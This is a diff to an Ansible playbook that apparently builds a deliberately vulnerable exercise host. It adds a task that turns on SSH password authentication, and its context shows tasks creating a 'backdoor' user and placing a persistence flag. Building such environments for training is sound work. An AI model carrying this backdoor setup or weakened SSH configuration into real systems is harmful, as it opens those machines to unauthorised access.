@@ -183,6 +183,14 @@
     line: 'PubkeyAuthentication yes'
     state: present
   register: sshd_pubkey
+
+- name: Enable password authentication in sshd
+  ansible.builtin.lineinfile:
+    path: /etc/ssh/sshd_config
+    regexp: '^#?\s*PasswordAuthentication'
+    line: 'PasswordAuthentication yes'
+    state: present
+  register: sshd_password
  
 - name: Enable and start sshd
   ansible.builtin.systemd:
@@ -194,7 +202,7 @@
   ansible.builtin.systemd:
     name: ssh
     state: restarted
-  when: sshd_pubkey.changed
+  when: sshd_pubkey.changed or sshd_password.changed
  
 - name: Add user 2 and set password for backdoor
   user:
@@ -214,7 +222,7 @@
     state: directory
     owner: '{{ username2 }}'
     group: '{{ username2 }}'
-    mode: '0770'
+    mode: '0700'
  
 - name: Place persistence flag in user B's .bash_profile
   ansible.builtin.copy:
